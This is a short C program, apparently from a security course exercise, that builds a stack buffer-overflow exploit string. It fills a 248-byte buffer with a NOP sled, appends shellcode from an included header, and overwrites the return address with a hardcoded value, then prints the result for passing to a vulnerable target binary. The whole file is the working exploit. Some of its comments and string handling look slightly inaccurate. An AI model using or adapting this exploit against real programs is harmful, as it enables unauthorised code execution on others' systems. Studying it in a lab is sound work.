#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include "shellcode.h"
/*
 * Construct your exploit string in the main function and print it.
 * You can pass it into a target binary <target> by running"<target> $(sploit)"
 * in your terminal.
 */

int main(void)
{
    int n = 0;
    for (; shellcode[n] != '\0'; n++);

    /*
     * Since the buffer is of 240 bytes, we need to overflow the RBP (4 bytes) 
     * and then the RET (other 4 bytes), putting at the returning @ the address
     * of our shellcode (or of the nop above)
     */ 

    int N = 248, address = 4, i;

    char* exploit = (char*) malloc((N+1)*sizeof(char));

    // Insert nop to avoid seg fault
    for (i=0; i<N-n-address; i++)
        exploit[i] = NOP;

    for (i=0; i<=n; i++)
        exploit[N-n-address+i] = shellcode[i];

    
    char* ret_address = "\x80\x05\x80\x40";
    strcat(exploit,ret_address);

    printf("%s", exploit);

    free(exploit);

    return 0;
}
